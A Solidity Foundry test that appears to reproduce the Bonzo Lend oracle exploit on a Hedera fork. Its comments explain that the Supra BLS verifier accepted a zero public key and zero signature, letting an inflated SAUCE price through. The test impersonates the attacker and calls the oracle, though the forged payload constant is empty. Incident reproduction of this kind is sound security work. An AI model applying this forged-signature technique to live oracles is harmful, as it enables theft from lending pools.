pragma solidity ^0.8.20;

import "forge-std/Test.sol";

// @KeyInfo - Total Lost : ~$9.05M
// Attacker : 0x9a4966152f6e10b33cb7a37975e8619816d6a494 (Hedera account 0.0.10633526)
// Vulnerable Oracle : 0x41ab2059baa4b73e9a3f55d30dff27179e0ea181 (Supra pull oracle)
// Vulnerable Lending Pool : 0x236897c518996163E7b313aD21D1C9fCC7BA1afc
// Manipulated Price Tx : 0xd50c55e24eb8483ec55bf74e84fc9853d0f0fe36f64abdb812a2d9afa2a10a60
// USDC Borrow Tx : 0xa62a9b778a2f5c33d384d99e9e22fcc5fc9eddeb892bd51a3933c02470e6a4a7
// WHBAR Borrow Tx : 0xf45426fef833b482d1bb2d6e7f648b124a86b3626bdcdfcdab5c5929cd567eb8
// Incident Report : https://bonzo.finance/blog/bonzo-lend-incident-report-oracle-provider-exploit
//
// @Analysis
// Supra's BLS verifier did not reject identity points. The attacker supplied committee id 2 with a
// zero public key and zero signature, so the EIP-197 pairing equation held trivially. That wrote a
// SAUCE price inflated by roughly 1e12; Bonzo then allowed two undercollateralized borrows.

contract BonzoLendExp is Test {
    address internal constant ATTACKER = 0x9A4966152F6e10b33Cb7a37975e8619816d6a494;
    address internal constant ORACLE = 0x41AB2059bAA4b73E9A3f55D30Dff27179e0eA181;

    bytes internal constant FORGED_PRICE_UPDATE =
        hex"";

    function setUp() public {
        vm.createSelectFork("hedera", 97_504_677);
    }

    function testExploit() public {
        vm.roll(97_504_678);
        vm.warp(1_783_731_099);
        vm.recordLogs();
        vm.prank(ATTACKER);
        (bool priceOk,) = ORACLE.call(FORGED_PRICE_UPDATE);
        assertTrue(priceOk, "forged zero-signature price rejected");
        Vm.Log[] memory entries = vm.getRecordedLogs();
        assertGt(entries.length, 0, "manipulated price was not published");
    }
}
